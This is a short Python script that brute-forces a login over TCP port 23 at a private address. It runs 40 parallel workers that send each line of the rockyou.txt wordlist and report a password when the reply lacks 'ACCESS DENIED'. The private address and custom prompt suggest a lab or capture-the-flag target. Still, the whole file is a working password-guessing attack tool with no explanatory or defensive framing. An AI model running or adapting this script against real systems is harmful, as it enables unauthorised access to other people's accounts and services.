#!/usr/bin/env python3

import sys
import socket
from multiprocessing import Pool as pool

THREADS = 40
HOST = '172.16.0.4'
PORT = 23
WORDLIST = './rockyou.txt'


with open(WORDLIST, 'rb') as f:
    wordlist = f.readlines()


def make_a_guess(password):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)  # get login screen
        s.sendall(password)
        data = s.recv(1024)  # get result message
        s.close()
    if data.find(b'ACCESS DENIED') == -1:
        print('[!] Password found!', password.decode())
        sys.exit(0)


if __name__ == '__main__':
    print(f'[*] Starting the pool with {THREADS} threads...')
    p = pool(THREADS)
    p.map(make_a_guess, wordlist)
    print('[*] Done! Ending all threads.')